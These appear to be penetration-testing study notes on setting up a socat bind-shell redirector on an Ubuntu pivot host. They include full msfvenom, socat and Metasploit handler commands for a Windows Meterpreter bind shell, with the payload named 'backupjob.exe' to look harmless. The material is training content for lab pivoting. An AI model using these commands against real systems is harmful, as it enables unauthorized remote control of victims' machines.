- Similar to our socat's reverse shell redirector, **we can also create a socat bind shell redirector.**
- In the case of bind shells, the **Windows server will start a listener and bind to a particular port.**
- We can create a bind shell payload for Windows and execute it on the Windows host.
- At the same time, **we can create a socat redirector on the Ubuntu server**, **which will listen for incoming connections from a Metasploit bind handler and forward that to a bind shell payload on a Windows target.**

![[Pasted image 20250717071457.png]]

- Creating the Windows Payload:
	- `msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443`
- We **can start a `socat bind shell` listener, which listens on port `8080` and forwards packets to Windows server `8443`.**:
- Starting Socat Bind Shell Listener:
	- `socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443`

- Finally, we can start a Metasploit bind handler. This bind handler can be configured to connect to our socat's listener on port 8080 (Ubuntu server)
  
- Configuring & Starting the Bind multi/handler:
	- `use exploit/multi/handler`
	- `set payload windows/x64/meterpreter/bind_tcp`
	- `set RHOST 10.129.202.64`
	- `set LPORT 8080`
	- `run`